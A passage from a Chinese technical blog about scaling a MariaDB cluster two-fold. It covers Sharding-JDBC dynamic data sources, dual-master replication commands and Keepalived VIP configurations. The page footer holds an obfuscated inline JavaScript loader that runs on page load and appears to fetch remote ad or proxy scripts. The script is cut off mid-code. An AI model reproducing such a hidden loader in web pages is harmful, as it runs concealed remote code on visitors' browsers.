    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">String</span> key <span class="token operator">:</span> dataSourceMap<span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        dataSourceConfigMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> <span class="token class-name">DataSourceConfiguration</span><span class="token punctuation">.</span><span class="token function">getDataSourceConfiguration</span><span class="token punctuation">(</span>dataSourceMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token class-name">String</span> result <span class="token operator">=</span> SHARDING_RULE_TABLE_ORDER<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>SHARDING_RULE_DATASOURCE<span class="token punctuation">,</span> newRule<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">replaceActualDataNodes</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>
    SHARDING_RULE_DATASOURCE <span class="token operator">=</span> newRule<span class="token punctuation">;</span>

    dataSource<span class="token punctuation">.</span><span class="token function">renew</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">DataSourceChangedEvent</span><span class="token punctuation">(</span>
        <span class="token string">"/"</span> <span class="token operator">+</span> <span class="token class-name">DruidSystemDataSourceConfiguration</span><span class="token punctuation">.</span>DYNAMIC_SHARDING <span class="token operator">+</span> <span class="token string">"/config/schema/logic_db/datasource"</span><span class="token punctuation">,</span>
        dataSourceConfigMap<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span>


<span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    log<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>


</code></pre> </li>
<li> <p>注意事项</p> <p>Sharding JDBC, Mycat, Drds 等产品都是分布式数据库中间件, 相比直接的数据源操作, 会存在一些限制, Sharding JDBC在使用时, 要注意以下问题:</p> 
  <ul>
<li>有限支持子查询</li>
<li>不支持HAVING</li>
<li>不支持OR，UNION 和 UNION ALL</li>
<li>不支持特殊INSERT</li>
<li>每条INSERT语句只能插入一条数据，不支持VALUES后有多行数据的语句</li>
<li>不支持DISTINCT聚合</li>
<li>不支持dual虚拟表查询</li>
<li>不支持SELECT LAST_INSERT_ID(), 不支持自增序列</li>
<li>不支持CASE WHEN</li>
</ul> </li>
</ol> 
<h3>
<a id="22__2N_814"></a>2.2 实现数据库的秒级平滑2N扩容</h3> 
<p>扩容部署架构：</p> 
<p><img src="https://images2.imgbox.com/81/5c/RvDIKZRe_o.png" alt="file"></p> 
<h4>
<a id="221_VIP_820"></a>2.2.1 新增数据库VIP</h4> 
<ol><li> <p>在Server2节点， 增加VIP</p> <p>修改/etc/keepalived/keepalived.conf</p> <pre><code class="prism language-sh">global_defs {
   router_id vip2
}
vrrp_instance VI_1 {            #vrrp实例定义
    state BACKUP               #lvs的状态模式，MASTER代表主， BACKUP代表备份节点
    interface ens33               #绑定对外访问的网卡
    virtual_router_id 112        #虚拟路由标示，同一个vrrp实例采用唯一标示
    priority 100               #优先级，100代表最大优先级， 数字越大优先级越高
    advert_int 1              #master与backup节点同步检查的时间间隔，单位是秒
    authentication {           #设置验证信息
        auth_type PASS         #有PASS和AH两种
        auth_pass 6666         #验证密码，BACKUP密码须相同
    }
    virtual_ipaddress {         #KeepAlived虚拟的IP地址
        192.168.116.151
    }
}
virtual_server 192.168.116.151 3306 {       #配置虚拟服务器IP与访问端口
    delay_loop 6                 #健康检查时间
    persistence_timeout 0        #会话保持时间，这里要做测试， 所以设为0， 实际可根据session有效时间配置
    protocol TCP               #转发协议类型，支持TCP和UDP
    real_server 192.168.116.141 3306{    #配置服务器节点VIP1
    notify_down /usr/local/shell/mariadb.sh
    weight 1               #设置权重，越大权重越高
    TCP_CHECK {              #r状态监测设置
       connect_timeout 10       #超时配置， 单位秒
       retry 3             #重试次数
       delay_before_retry 3        #重试间隔
       connect_port 3306         #连接端口， 和上面保持一致
       }
    }

}

</code></pre> <p>注意配置项：</p> <pre><code class="prism language-sh">virtual_router_id 112        #虚拟路由标示，同一个vrrp实例采用唯一标示
priority 100               #优先级，100代表最大优先级， 数字越大优先级越高
</code></pre> </li></ol> 
<h4>
<a id="222__872"></a>2.2.2 应用服务增加动态数据源</h4> 
<ol>
<li> <p>修改应用服务配置， 增加新的数据源， 指向新设置的VIP： 192.168.116.151</p> </li>
<li> <p>通过应用服务接口， 动态扩容调整</p> </li>
</ol> 
<h4>
<a id="223__880"></a>2.2.3 解除原双主同步</h4> 
<p>mysql -uroot -p654321</p> 
<ol>
<li> <p>进入Server1:</p> <pre><code class="prism language-sh">MariaDB [(none)]&gt; stop slave;
</code></pre> </li>
<li> <p>进入Server2:</p> <pre><code class="prism language-sh">MariaDB [(none)]&gt; stop slave;
</code></pre> </li>
<li> <p>通过应用服务接口验证数据是否解除同步</p> </li>
</ol> 
<h4>
<a id="224_MariaDB_900"></a>2.2.4 安装MariaDB扩容服务器</h4> 
<ol>
<li> <p>新建两台虚拟机， 分别为Server3和Server4。</p> </li>
<li> <p>在Server3和Server4两台节点上安装MariaDB服务</p> <p>参考2.1.1 MariaDB服务安装</p> </li>
<li> <p>配置Server3与Server1，实现新的双主同步</p> 
  <ol><li>Server3节点， 修改/etc/my.cnf:</li></ol> <pre><code class="prism language-sh">[mysqld]
server-id = 3
log-bin=mysql-bin
relay-log = mysql-relay-bin
replicate-wild-ignore-table=mysql.%
replicate-wild-ignore-table=information_schema.%
log-slave-updates=on
slave-skip-errors=all
auto-increment-offset=2
auto-increment-increment=2
binlog_format=mixed
expire_logs_days=10

</code></pre> 
  <ol start="2"><li>重启Server3数据库</li></ol> <pre><code class="prism language-sh">service mariadb restart
</code></pre> 
  <ol start="3"><li>创建replica用于主从同步的用户：</li></ol> <pre><code class="prism language-sh">MariaDB [(none)]&gt; grant replication slave, replication client on *.* to 'replica'@'%' identified by 'replica';
mysql&gt; flush privileges;
</code></pre> 
  <ol start="4"><li>在Server1节点，进行数据全量备份：</li></ol> <pre><code class="prism language-sh">mysqldump -uroot -p654321 --routines --single_transaction --master-data=2 --databases smooth &gt; server1.sql

</code></pre> 
  <ol start="5"><li>查看并记录master status信息：</li></ol> <pre><code class="prism language-sh">...
--
-- Position to start replication or point-in-time recovery from
--

-- CHANGE MASTER TO MASTER_LOG_FILE='mysql-bin.000002', MASTER_LOG_POS=17748;
...

</code></pre> 
  <ol start="6"><li>将备份的server1.sql通过scp命令拷贝至Server3节点。</li></ol> <pre><code class="prism language-sh">scp server1.sql root@192.168.116.142:/usr/local/
</code></pre> 
  <ol start="7"><li>将数据还原至Server3节点：</li></ol> <pre><code class="prism language-sh">mysql -uroot -p654321 &lt; /usr/local/server1.sql
</code></pre> 
  <ol start="8"><li>配置主从同步信息</li></ol> <p>根据上面的master status信息， 在Server3中执行：</p> <pre><code class="prism language-sh">MariaDB [(none)]&gt; change master to master_host='192.168.116.140',master_user='replica', master_password='replica', master_port=3306, master_log_file='mysql-bin.000016', master_log_pos=1754, master_connect_retry=30;
Query OK, 0 rows affected (0.01 sec)

</code></pre> 
  <ol start="9"><li>开启主从同步：</li></ol> <pre><code class="prism language-sh">MariaDB [(none)]&gt; start slave;
Query OK, 0 rows affected (0.00 sec)

</code></pre> <p>如果出现问题， 复原主从同步信息：</p> <pre><code class="prism language-sh">MariaDB [(none)]&gt; reset slave;
Query OK, 0 rows affected (0.01 sec)

</code></pre> 
  <ol start="10"><li>检查同步状态信息：</li></ol> <pre><code class="prism language-sh">MariaDB [(none)]&gt; show slave status G
*************************** 1. row ***************************
               Slave_IO_State: Waiting for master to send event
                  Master_Host: 10.10.20.125
                  Master_User: replica
                  Master_Port: 3306
                Connect_Retry: 30
              Master_Log_File: mysql-bin.000004
          Read_Master_Log_Pos: 11174
               Relay_Log_File: mysql-relay-bin.000002
                Relay_Log_Pos: 1746
        Relay_Master_Log_File: mysql-bin.000004
             Slave_IO_Running: Yes
            Slave_SQL_Running: Yes

</code></pre> 
  <ol start="11"><li>配置Server1与Server3节点的同步</li></ol> <p>查看Server3的日志信息：</p> <pre><code class="prism language-sh">MariaDB [(none)]&gt; show master status;
+------------------+----------+--------------+------------------+
| File             | Position | Binlog_Do_DB | Binlog_Ignore_DB |
+------------------+----------+--------------+------------------+
| mysql-bin.000001 |     4781 |              |                  |
+------------------+----------+--------------+------------------+

</code></pre> <p>在Server1节点， 配置同步信息：</p> <pre><code class="prism language-sh">MariaDB [(none)]&gt; reset slave;
Query OK, 0 rows affected (0.00 sec)

MariaDB [(none)]&gt; change master to master_host='192.168.116.142',master_user='replica', master_password='replica', master_port=3306, master_log_file='mysql-bin.000005', master_log_pos=6931, master_connect_retry=30;

MariaDB [(none)]&gt; start slave;
Query OK, 0 rows affected (0.00 sec)

</code></pre> </li>
<li> <p>配置Server4与Server2的双主同步</p> 
  <ol><li>Server4节点， 修改/etc/my.cnf:</li></ol> <pre><code class="prism language-sh">[mysqld]
server-id = 4
log-bin=mysql-bin
relay-log = mysql-relay-bin
replicate-wild-ignore-table=mysql.%
replicate-wild-ignore-table=information_schema.%
log-slave-updates=on
slave-skip-errors=all
auto-increment-offset=2
auto-increment-increment=2
binlog_format=mixed
expire_logs_days=10

</code></pre> 
  <ol start="2"><li>重启Server4数据库</li></ol> <pre><code class="prism language-sh">service mariadb restart
</code></pre> 
  <ol start="3"><li>创建replica用于主从同步的用户：</li></ol> <pre><code class="prism language-sh">MariaDB [(none)]&gt; grant replication slave, replication client on *.* to 'replica'@'%' identified by 'replica';
mysql&gt; flush privileges;
</code></pre> 
  <ol start="4"><li>在Server2节点，进行数据全量备份：</li></ol> <pre><code class="prism language-sh">mysqldump -uroot -p654321 --routines --single_transaction --master-data=2 --databases smooth &gt; server2.sql

</code></pre> 
  <ol start="5"><li>查看并记录master status信息：</li></ol> <pre><code class="prism language-sh">...
--
-- Position to start replication or point-in-time recovery from
--

-- CHANGE MASTER TO MASTER_LOG_FILE='mysql-bin.000003', MASTER_LOG_POS=4208;

...

</code></pre> 
  <ol start="6"><li>将备份的server2.sql通过scp命令拷贝至Server4节点。</li></ol> <pre><code class="prism language-sh">scp server2.sql root@192.168.116.143:/usr/local/
</code></pre> 
  <ol start="7"><li>将数据还原至Server4节点：</li></ol> <pre><code class="prism language-sh">mysql -uroot -p654321 &lt; /usr/local/server2.sql
</code></pre> 
  <ol start="8"><li>配置主从同步信息</li></ol> <p>根据上面的master status信息， 在Server4中执行：</p> <pre><code class="prism language-sh">MariaDB [(none)]&gt; change master to master_host='192.168.116.141',master_user='replica', master_password='replica', master_port=3306, master_log_file='mysql-bin.000007', master_log_pos=3006, master_connect_retry=30;
Query OK, 0 rows affected (0.01 sec)

</code></pre> 
  <ol start="9"><li>开启主从同步：</li></ol> <pre><code class="prism language-sh">MariaDB [(none)]&gt; start slave;
Query OK, 0 rows affected (0.00 sec)

</code></pre> <p>注意， 如果出现问题， 复原主从同步信息：</p> <pre><code class="prism language-sh">MariaDB [(none)]&gt; reset slave;
Query OK, 0 rows affected (0.01 sec)

</code></pre> 
  <ol start="10"><li>检查同步状态信息：</li></ol> <pre><code class="prism language-sh">MariaDB [(none)]&gt; show slave status G
*************************** 1. row ***************************
               Slave_IO_State: Waiting for master to send event
                  Master_Host: 10.10.20.125
                  Master_User: replica
                  Master_Port: 3306
                Connect_Retry: 30
              Master_Log_File: mysql-bin.000004
          Read_Master_Log_Pos: 11174
               Relay_Log_File: mysql-relay-bin.000002
                Relay_Log_Pos: 1746
        Relay_Master_Log_File: mysql-bin.000004
             Slave_IO_Running: Yes
            Slave_SQL_Running: Yes

</code></pre> 
  <ol start="11"><li>配置Server2与Server4节点的同步</li></ol> <p>查看Server4的日志信息：</p> <pre><code class="prism language-sh">MariaDB [(none)]&gt; show master status;
+------------------+----------+--------------+------------------+
| File             | Position | Binlog_Do_DB | Binlog_Ignore_DB |
+------------------+----------+--------------+------------------+
| mysql-bin.000001 |     3696 |              |                  |
+------------------+----------+--------------+------------------+

</code></pre> <p>在Server2节点， 配置同步信息：</p> <pre><code class="prism language-sh">MariaDB [(none)]&gt; reset slave;
Query OK, 0 rows affected (0.00 sec)

MariaDB [(none)]&gt; change master to master_host='192.168.116.143',master_user='replica', master_password='replica', master_port=3306, master_log_file='mysql-bin.000005', master_log_pos=5787, master_connect_retry=30;

MariaDB [(none)]&gt; start slave;
Query OK, 0 rows affected (0.00 sec)

</code></pre> </li>
</ol> 
<h4>
<a id="225_KeepAlived_1191"></a>2.2.5 增加KeepAlived服务实现高可用</h4> 
<ol>
<li> <p>确保新增的Server3和Server4节点安装Keepalived服务。</p> </li>
<li> <p>修改Server3节点配置</p> <pre><code class="prism language-sh">global_defs {
   router_id vip3          # 机器标识，一般设为hostname，故障发生时，邮件通知会使用到。
}
vrrp_instance VI_1 {            #vrrp实例定义
    state BACKUP               #lvs的状态模式，MASTER代表主， BACKUP代表备份节点
    interface ens33               #绑定对外访问的网卡
    virtual_router_id 111        #虚拟路由标示，同一个vrrp实例采用唯一标示
    priority 98               #优先级，100代表最大优先级， 数字越大优先级越高
    advert_int 1              #master与backup节点同步检查的时间间隔，单位是秒
    authentication {           #设置验证信息
        auth_type PASS         #有PASS和AH两种
        auth_pass 6666         #验证密码，BACKUP密码须相同
    }
    virtual_ipaddress {         #KeepAlived虚拟的IP地址
        192.168.116.150
    }
}
virtual_server 192.168.116.150 3306 {       #配置虚拟服务器IP与访问端口
    delay_loop 6                 #健康检查时间
    persistence_timeout 0        #会话保持时间，这里要做测试， 所以设为0， 实际可根据session有效时间配置
    protocol TCP               #转发协议类型，支持TCP和UDP
    real_server 192.168.116.142 3306{    #配置服务器节点VIP3
    notify_down /usr/local/shell/mariadb.sh
    weight 1               #设置权重，越大权重越高
    TCP_CHECK {              #r状态监测设置
       connect_timeout 10       #超时配置， 单位秒
       retry 3             #重试次数
       delay_before_retry 3        #重试间隔
       connect_port 3306         #连接端口， 和上面保持一致
       }
    }

}

</code></pre> <p>注意里面IP配置正确， 修改完成后重启服务。</p> <p>创建关闭脚本mariadb.sh</p> <p>/usr/local/shell/mariadb.sh：</p> <pre><code class="prism language-sh">pkill keepalived
</code></pre> <p>加入执行权限：</p> <pre><code class="prism language-sh">chmod a+x mariadb.sh
</code></pre> </li>
<li> <p>修改Server4节点配置</p> <pre><code class="prism language-sh">global_defs {
   router_id vip4          # 机器标识，一般设为hostname，故障发生时，邮件通知会使用到。
}
vrrp_instance VI_1 {            #vrrp实例定义
    state BACKUP               #lvs的状态模式，MASTER代表主， BACKUP代表备份节点
    interface ens33               #绑定对外访问的网卡
    virtual_router_id 112        #虚拟路由标示，同一个vrrp实例采用唯一标示
    priority 98               #优先级，100代表最大优先级， 数字越大优先级越高
    advert_int 1              #master与backup节点同步检查的时间间隔，单位是秒
    authentication {           #设置验证信息
        auth_type PASS         #有PASS和AH两种
        auth_pass 6666         #验证密码，BACKUP密码须相同
    }
    virtual_ipaddress {         #KeepAlived虚拟的IP地址
        192.168.116.151
    }
}
virtual_server 192.168.116.151 3306 {       #配置虚拟服务器IP与访问端口
    delay_loop 6                 #健康检查时间
    persistence_timeout 0        #会话保持时间，这里要做测试， 所以设为0， 实际可根据session有效时间配置
    protocol TCP               #转发协议类型，支持TCP和UDP
    real_server 192.168.116.143 3306{    #配置服务器节点VIP4
    notify_down /usr/local/shell/mariadb.sh
    weight 1               #设置权重，越大权重越高
    TCP_CHECK {              #r状态监测设置
       connect_timeout 10       #超时配置， 单位秒
       retry 3             #重试次数
       delay_before_retry 3        #重试间隔
       connect_port 3306         #连接端口， 和上面保持一致
       }
    }

}


</code></pre> <p>创建关闭脚本mariadb.sh</p> <p>/usr/local/shell/mariadb.sh：</p> <pre><code class="prism language-sh">pkill keepalived
</code></pre> <p>给所有的用户组加入执行权限：</p> <pre><code class="prism language-sh">chmod a+x mariadb.sh
</code></pre> </li>
<li> <p>修改完后重启Keepalived服务。</p> </li>
</ol> 
<h4>
<a id="226__1312"></a>2.2.6 清理数据并验证</h4> 
<ol>
<li> <p>通过应用服务动态扩容接口做调整和验证</p> </li>
<li> <p>在Server1节点清理数据</p> <p>根据取模规则， 保留accountNo为偶数的数据</p> <pre><code class="prism language-sh">delete from t_trade_order where accountNo % 2 != 0
</code></pre> </li>
<li> <p>在Server2节点清理数据</p> <p>根据取模规则， 保留accountNo为奇数的数据</p> <pre><code class="prism language-sh">delete from t_trade_order where accountNo % 2 != 1
</code></pre> </li>
</ol> 
<h2>
<a id="3keepalived_1343"></a>3.keepalived高可用配置大全</h2> 
<p>在Server1（192.168.116.140）中执行：</p> 
<pre><code class="prism language-sh">MariaDB [(none)]&gt; change master to master_host='192.168.116.141',master_user='replica', master_password='replica', master_port=3306, master_log_file='mysql-bin.000005', master_log_pos=3207, master_connect_retry=30;

</code></pre> 
<p>在Server2（192.168.116.141）中执行：</p> 
<pre><code class="prism language-sh">MariaDB [(none)]&gt; change master to master_host='192.168.116.140',master_user='replica', master_password='replica', master_port=3306, master_log_file='mysql-bin.000012', master_log_pos=1951, master_connect_retry=30;

</code></pre> 
<p>在Server3（192.168.116.142）中执行：</p> 
<pre><code>MariaDB [(none)]&gt; change master to master_host='192.168.116.140',master_user='replica', master_password='replica', master_port=3306, master_log_file='mysql-bin.000013', master_log_pos=2781, master_connect_retry=30;
Query OK, 0 rows affected (0.01 sec)
</code></pre> 
<p>在Server4（192.168.116.143）中执行：</p> 
<pre><code>MariaDB [(none)]&gt; change master to master_host='192.168.116.141',master_user='replica', master_password='replica', master_port=3306, master_log_file='mysql-bin.000005', master_log_pos=7358, master_connect_retry=30;
Query OK, 0 rows affected (0.01 sec)
</code></pre> 
<h3>
<a id="Server1Server2_1375"></a>Server1和Server2双主关系</h3> 
<h4>
<a id="Server1_keepalivedconf_1377"></a>Server1: keepalived.conf</h4> 
<p>vi /etc/keepalived/keepalived.conf</p> 
<pre><code>global_defs {
   router_id vip1
}
vrrp_instance VI_1 {
    state BACKUP
    interface ens33
    virtual_router_id 111
    priority 100
    advert_int 1
    authentication {
        auth_type PASS
        auth_pass 6666
    }
    virtual_ipaddress {
        192.168.116.150
    }
}
virtual_server 192.168.116.150 3306 {
    delay_loop 6
    lb_algo rr
    lb_kind DR // NAT|DR|TUN
    persistence_timeout 0
    protocol TCP
    real_server 192.168.116.140 3306 {
    notify_down /usr/local/shell/mariadb.sh
    weight 1
    TCP_CHECK {
       connect_timeout 10
       retry 3
       delay_before_retry 3
       connect_port 3306
       }
    }
}
</code></pre> 
<h4>
<a id="Server2keepalivedconf_1418"></a>Server2:keepalived.conf</h4> 
<p>vi /etc/keepalived/keepalived.conf</p> 
<pre><code>global_defs {
   router_id vip2
}
vrrp_instance VI_1 {
    state BACKUP
    interface ens33
    virtual_router_id 111
    priority 98
    advert_int 1
    authentication {
        auth_type PASS
        auth_pass 6666
    }
    virtual_ipaddress {
        192.168.116.150
    }
}
virtual_server 192.168.116.150 3306 {
    delay_loop 6
    lb_algo rr
    lb_kind DR
    persistence_timeout 0
    protocol TCP
    real_server 192.168.116.141 3306{
    notify_down /usr/local/shell/mariadb.sh
    weight 1
    TCP_CHECK {
       connect_timeout 10
       retry 3
       delay_before_retry 3
       connect_port 3306
       }
    }
}
</code></pre> 
<h3>
<a id="VIP_1459"></a>新增数据库VIP</h3> 
<h4>
<a id="Server2keepalivedconf_1461"></a>Server2:keepalived.conf</h4> 
<p>vi /etc/keepalived/keepalived.conf</p> 
<pre><code>global_defs {
   router_id vip2
}
vrrp_instance VI_1 {
    state BACKUP
    interface ens33
    virtual_router_id 112
    priority 100
    advert_int 1
    authentication {
        auth_type PASS
        auth_pass 6666
    }
    virtual_ipaddress {
        192.168.116.151
    }
}
virtual_server 192.168.116.151 3306 {
    delay_loop 6
    persistence_timeout 0
    protocol TCP
    real_server 192.168.116.141 3306{
    notify_down /usr/local/shell/mariadb.sh
    weight 1
    TCP_CHECK {
       connect_timeout 10
       retry 3
       delay_before_retry 3
       connect_port 3306
       }
    }
}
</code></pre> 
<h3>
<a id="Server1Server3_1500"></a>Server1和Server3双主关系</h3> 
<h4>
<a id="Server3_keepalivedconf_1502"></a>Server3: keepalived.conf</h4> 
<p>vi /etc/keepalived/keepalived.conf</p> 
<pre><code>global_defs {
   router_id vip3
}
vrrp_instance VI_1 {
    state BACKUP
    interface ens33
    virtual_router_id 111
    priority 98
    advert_int 1
    authentication {
        auth_type PASS
        auth_pass 6666
    }
    virtual_ipaddress {
        192.168.116.150
    }
}
virtual_server 192.168.116.150 3306 {
    delay_loop 6
    lb_algo rr
    lb_kind DR
    persistence_timeout 0
    protocol TCP
    real_server 192.168.116.142 3306 {
    notify_down /usr/local/shell/mariadb.sh
    weight 1
    TCP_CHECK {
       connect_timeout 10
       retry 3
       delay_before_retry 3
       connect_port 3306
       }
    }
}
</code></pre> 
<h3>
<a id="Server2Server4_1543"></a>Server2和Server4双主关系</h3> 
<h4>
<a id="Server4_keepalivedconf_1545"></a>Server4: keepalived.conf</h4> 
<p>vi /etc/keepalived/keepalived.conf</p> 
<pre><code>global_defs {
   router_id vip4
}
vrrp_instance VI_1 {
    state BACKUP
    interface ens33
    virtual_router_id 112
    priority 98
    advert_int 1
    authentication {
        auth_type PASS
        auth_pass 6666
    }
    virtual_ipaddress {
        192.168.116.151
    }
}
virtual_server 192.168.116.151 3306 {
    delay_loop 6
    lb_algo rr
    lb_kind DR
    persistence_timeout 0
    protocol TCP
    real_server 192.168.116.143 3306{
    notify_down /usr/local/shell/mariadb.sh
    weight 1
    TCP_CHECK {
       connect_timeout 10
       retry 3
       delay_before_retry 3
       connect_port 3306
       }
    }
}
</code></pre> 
<blockquote> 
 <p>专注Java技术干货分享，欢迎志同道合的小伙伴，一起交流学习</p> 
</blockquote>
                </div>
                
                

		</div>
	</article>
</main>




			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程小白.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://www.w3counter.com/tracker.js?id=150625"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X